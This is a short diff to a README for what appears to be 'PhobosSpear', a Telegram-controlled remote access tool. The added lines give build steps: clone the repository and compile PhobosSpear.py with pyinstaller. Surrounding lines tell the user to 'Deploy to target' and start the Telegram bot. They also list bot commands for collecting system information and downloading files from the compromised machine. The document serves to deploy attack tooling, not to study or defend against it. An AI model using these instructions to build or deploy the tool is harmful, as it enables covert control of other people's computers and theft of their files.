@@ -18,7 +18,15 @@
 
   ```bash
   pip install -U pyinstaller
-  pyinstaller phobos.py
+  ```
+   ```bash
+  git clone https://github.com/mkdirlove/PhobosSpear.git
+   ```
+    ```bash
+  cd PhobosSpear
+    ```
+     ```bash
+  pyinstaller PhobosSpear.py
   ```
 - Deploy to target
 - Start telegram bot
@@ -62,5 +70,3 @@
     /envInfo - Provide detailed system information
     /downloadFile <file_path> - Download a specified file
   ```
-
-### Screenshots
